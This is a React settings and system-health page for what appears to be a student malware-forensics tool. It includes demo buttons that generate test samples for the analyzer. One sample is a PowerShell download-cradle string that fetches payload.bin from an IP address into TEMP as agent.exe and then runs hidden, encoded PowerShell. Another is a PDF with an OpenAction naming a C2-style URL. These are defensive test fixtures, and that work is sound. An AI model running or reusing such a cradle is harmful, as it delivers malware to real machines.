import React, { useEffect, useState } from 'react';
import {
  Server,
  Shield,
  Bot,
  CheckCircle2,
  AlertCircle,
  PlayCircle,
} from 'lucide-react';
import { api } from '../services/api';
import { SystemHealth } from '../types';

interface SettingsProps {
  onSelectInvestigation: (id: string) => void;
}

export const Settings: React.FC<SettingsProps> = ({ onSelectInvestigation }) => {
  const [health, setHealth] = useState<SystemHealth | null>(null);
  const [loading, setLoading] = useState(true);
  const [loadingSample, setLoadingSample] = useState(false);
  const [sampleStatus, setSampleStatus] = useState<string | null>(null);

  const fetchHealth = async () => {
    try {
      setLoading(true);
      const data = await api.getSystemHealth();
      setHealth(data);
    } catch (err: any) {
      console.error('Failed to load health:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchHealth();
  }, []);

  const handleRunSample = async (sampleType: 'benign' | 'suspicious_pdf' | 'suspicious_script') => {
    try {
      setLoadingSample(true);
      setSampleStatus(`Preparing ${sampleType} test sample...`);

      let fakeFile: File;
      if (sampleType === 'benign') {
        const content = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\nxref\n0 3\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\ntrailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n110\n%%EOF';
        fakeFile = new File([content], 'academic_research_proposal.pdf', { type: 'application/pdf' });
      } else if (sampleType === 'suspicious_pdf') {
        const content = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n4 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("http://malicious-c2-update.org/payload.exe");) >>\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000074 00000 n\n0000000133 00000 n\n0000000204 00000 n\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n340\n%%EOF';
        fakeFile = new File([content], 'urgent_invoice_action.pdf', { type: 'application/pdf' });
      } else {
        const content = '$wc = New-Object System.Net.WebClient\n$wc.DownloadFile("http://185.196.11.42/payload.bin", "$env:TEMP\\agent.exe")\npowershell -w hidden -enc aQB3AHIA...';
        fakeFile = new File([content], 'system_update_cradle.ps1', { type: 'text/x-script' });
      }

      setSampleStatus('Executing multi-stage forensic analysis...');
      const inv = await api.analyzeFile(fakeFile);
      setSampleStatus(`Analysis completed: ${inv.original_name} (Risk: ${inv.risk_score}/100)`);
      setTimeout(() => {
        onSelectInvestigation(inv.id);
      }, 1000);
    } catch (err: any) {
      setSampleStatus(`Sample analysis failed: ${err.message}`);
    } finally {
      setLoadingSample(false);
    }
  };

  return (
    <div className="space-y-6 max-w-4xl mx-auto">
      {/* Page Title */}
      <div className="border-b border-[#232630] pb-4">
        <h1 className="text-xl font-bold text-zinc-100 flex items-center gap-2">
          <span>Settings & System Health Diagnostics</span>
        </h1>
        <p className="text-xs text-zinc-400 mt-1">
          Verify runtime dependencies, active database connections, forensic parsers, and local AI availability.
        </p>
      </div>

      {/* University & Academic Project Info */}
      <div className="p-5 rounded-xl border border-[#272a34] bg-[#16181f] space-y-3">
        <div className="flex items-center gap-2">
          <Shield className="w-4 h-4 text-white" />
          <span className="text-xs font-bold text-zinc-100">Academic Project Specifications</span>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
          <div className="p-3 rounded-lg bg-[#111317] border border-[#232630]">
            <span className="text-zinc-400 block text-[11px]">Academic Institution:</span>
            <span className="font-semibold text-zinc-200">{health?.university || 'SRM University Delhi-NCR, Sonipat'}</span>
          </div>
          <div className="p-3 rounded-lg bg-[#111317] border border-[#232630]">
            <span className="text-zinc-400 block text-[11px]">Department / Degree:</span>
            <span className="font-semibold text-zinc-200">B.Tech Computer Science & Engineering (Data Science & AI)</span>
          </div>
          <div className="p-3 rounded-lg bg-[#111317] border border-[#232630]">
            <span className="text-zinc-400 block text-[11px]">Academic Session:</span>
            <span className="font-semibold text-zinc-200">2026–2027</span>
          </div>
          <div className="p-3 rounded-lg bg-[#111317] border border-[#232630]">
            <span className="text-zinc-400 block text-[11px]">Runtime Architecture:</span>
            <span className="font-semibold text-white">macOS ARM64 / POSIX Compliant</span>
          </div>
        </div>
      </div>

      {/* Quick Test Demo Samples Runner */}
      <div className="p-5 rounded-xl border border-[#2d303c] bg-[#14161d] space-y-3">
        <div>
          <div className="flex items-center gap-2 text-xs font-bold text-zinc-200">
            <PlayCircle className="w-4 h-4 text-white" />
            <span>Live Demonstration Sample Trigger</span>
          </div>
          <p className="text-[11px] text-zinc-400 mt-1">
            Instantly run end-to-end digital forensics on pre-calibrated academic test fixtures for university viva evaluation.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-3">
          <button
            onClick={() => handleRunSample('benign')}
            disabled={loadingSample}
            className="flex items-center gap-1.5 px-3.5 py-2 rounded-lg bg-[#18181b] border border-[#27272a]/80 hover:bg-emerald-900/60 text-zinc-200 text-xs font-semibold cursor-pointer transition-all"
          >
            <span>Triage Benign Research PDF</span>
          </button>

          <button
            onClick={() => handleRunSample('suspicious_pdf')}
            disabled={loadingSample}
            className="flex items-center gap-1.5 px-3.5 py-2 rounded-lg bg-red-950/60 border border-red-700/80 hover:bg-red-900/60 text-red-300 text-xs font-semibold cursor-pointer transition-all"
          >
            <span>Triage Exploit Document (PDF)</span>
          </button>

          <button
            onClick={() => handleRunSample('suspicious_script')}
            disabled={loadingSample}
            className="flex items-center gap-1.5 px-3.5 py-2 rounded-lg bg-amber-950/60 border border-amber-700/80 hover:bg-amber-900/60 text-amber-300 text-xs font-semibold cursor-pointer transition-all"
          >
            <span>Triage Download Cradle (.PS1)</span>
          </button>
        </div>

        {sampleStatus && (
          <div className="p-2.5 rounded bg-[#111317] border border-[#232630] text-[11px] text-zinc-200 font-mono">
            {sampleStatus}
          </div>
        )}
      </div>

      {/* Services Health Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        {/* Backend & DB */}
        <div className="p-4 rounded-xl border border-[#272a34] bg-[#16181f] space-y-3">
          <div className="flex items-center gap-2 text-xs font-semibold text-zinc-200">
            <Server className="w-4 h-4 text-white" />
            <span>Backend & Persistence Layer</span>
          </div>
          <div className="space-y-2 text-xs">
            <div className="flex items-center justify-between p-2 rounded bg-[#111317] border border-[#232630]">
              <span className="text-zinc-400">Database Engine:</span>
              <span className="font-semibold text-white flex items-center gap-1">
                <CheckCircle2 className="w-3.5 h-3.5" />
                <span>SQLite (aiosqlite) / PostgreSQL Ready</span>
              </span>
            </div>
            <div className="flex items-center justify-between p-2 rounded bg-[#111317] border border-[#232630]">
              <span className="text-zinc-400">Quarantine Storage:</span>
              <span className="font-mono text-[11px] text-zinc-300">data/quarantine</span>
            </div>
            <div className="flex items-center justify-between p-2 rounded bg-[#111317] border border-[#232630]">
              <span className="text-zinc-400">Upload Limit:</span>
              <span className="font-semibold text-zinc-200">50 MB per sample</span>
            </div>
          </div>
        </div>

        {/* AI & Local Models */}
        <div className="p-4 rounded-xl border border-[#272a34] bg-[#16181f] space-y-3">
          <div className="flex items-center gap-2 text-xs font-semibold text-zinc-200">
            <Bot className="w-4 h-4 text-white" />
            <span>Local AI & Rule Engines</span>
          </div>
          <div className="space-y-2 text-xs">
            <div className="flex items-center justify-between p-2 rounded bg-[#111317] border border-[#232630]">
              <span className="text-zinc-400">YARA 4.5 Signature Engine:</span>
              <span className={`font-semibold flex items-center gap-1 ${health?.yara_installed ? 'text-white' : 'text-zinc-400'}`}>
                {health?.yara_installed ? <CheckCircle2 className="w-3.5 h-3.5" /> : <AlertCircle className="w-3.5 h-3.5" />}
                <span>{health?.yara_installed ? 'Compiled & Active' : 'Not Loaded'}</span>
              </span>
            </div>
            <div className="flex items-center justify-between p-2 rounded bg-[#111317] border border-[#232630]">
              <span className="text-zinc-400">Ollama Local LLM:</span>
              <span className="text-zinc-300 font-medium">
                {health?.ollama_connected ? 'Connected (mistral)' : 'Offline (Deterministic XAI Active)'}
              </span>
            </div>
            <div className="flex items-center justify-between p-2 rounded bg-[#111317] border border-[#232630]">
              <span className="text-zinc-400">XAI Fallback:</span>
              <span className="text-zinc-300 font-semibold">Deterministic Expert System</span>
            </div>
          </div>
        </div>
      </div>

      {/* Available Forensic Parsers List */}
      <div className="p-5 rounded-xl border border-[#272a34] bg-[#16181f] space-y-3">
        <div className="flex items-center justify-between">
          <span className="text-xs font-semibold text-zinc-200">Active Forensic & Machine Learning Modules</span>
          <span className="text-[10px] text-zinc-400">{health?.available_forensic_modules.length || 0} loaded</span>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
          {health?.available_forensic_modules.map((mod, idx) => (
            <div key={idx} className="p-2.5 rounded-lg bg-[#111317] border border-[#232630] flex items-center gap-2 text-zinc-300">
              <CheckCircle2 className="w-3.5 h-3.5 text-white shrink-0" />
              <span>{mod}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};
